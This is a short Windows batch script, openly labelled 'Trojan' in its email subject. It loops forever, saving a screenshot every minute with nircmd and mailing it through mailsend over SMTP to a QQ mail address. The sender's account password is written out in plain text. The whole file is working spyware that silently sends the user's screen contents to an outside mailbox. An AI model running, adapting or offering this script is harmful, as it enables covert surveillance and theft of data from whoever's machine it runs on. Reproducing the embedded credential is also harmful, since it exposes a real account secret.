@echo off

PATH %CD%\bin

:loop

nircmd savescreenshot 1.png

mailsend -to 1271602283@qq.com -from 1271602283@qq.com -ssl -port 465 -auth-login -smtp smtp.qq.com -sub "Trojan" -user 1271602283@qq.com -pass "bumhgcbwaknibade" -attach 1.png

nircmd wait 60000

goto loop